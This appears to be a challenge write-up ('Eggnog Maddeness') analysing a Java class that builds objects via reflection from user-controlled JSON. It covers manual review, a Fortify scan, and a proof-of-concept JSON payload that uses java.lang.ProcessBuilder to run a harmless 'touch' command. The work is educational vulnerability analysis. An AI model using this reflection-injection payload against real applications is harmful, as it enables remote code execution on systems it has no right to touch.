# Day 2 - Eggnog Maddeness
The main vulnerability in this code is that user input is used to dynamically instantiate and object via reflection.
## Static Analysis
Looking at the source code, we find this is the definition of a java class. The java class has a public constructor which indicates it takes in raw json which is user controlled. Manual investigation, the flow can be traced to into the parse functions which then is used to invoke the private constructor. The data returned from the parsed data is still user controlled, it has just been validated as properly formatted json. The private constructor uses the user data to create a dynmaic object. This can allow the user to control what object is able to be instantiated which can lead to undefined behavior or even RCE.

## Fortify Scan
We can scan this code with static analysis code tools to see if it can find the vuln aswell. To do this, the code was slightly modified as can be seen in `MainController.java` to faciliate dataflow as well as make directly exploitable by a user for the next section. Since there is no real custom libraries, we should be able to run the out-of-the-box configuration.

First we need to try and compile to code to make sure we have the class path correct.

```bash
javac MainController.java
MainController.java:1: error: package org.json does not exist
import org.json.*;
^
MainController.java:5: error: cannot find symbol
        JSONObject obj = new JSONObject(rawJson);
```
Looks like we need to get some JARs for the classpath. Doing some googling, we can find the JAR here:
```bash
wget https://repo1.maven.org/maven2/org/json/json/20140107/json-20140107.jar

javac -cp ./json-20140107.jar MainController.java
```
And now we have the class file. Time to scan it.
```bash
# translate
sourceanalyzer -b eggnog -classpath ./json-20140107.jar MainController.java

# scan
sourceanalyzer -b eggnog -scan
```
## Dynamic Analysis
After modifying the source code to what is in this example, we can invoke RCE by passing a valid `ProcessBuilder` class to the offending function by crafting specific JSON. The following will demonstrate RCE on this vulnerability.

```bashg
java -cp $(pwd):$(pwd)/json-20140107.jar MainController "{\"controller\":\"java.lang.ProcessBuilder\",\"task\":\"start\",\"data\":[\"touch\",\"vuln\"]}"
```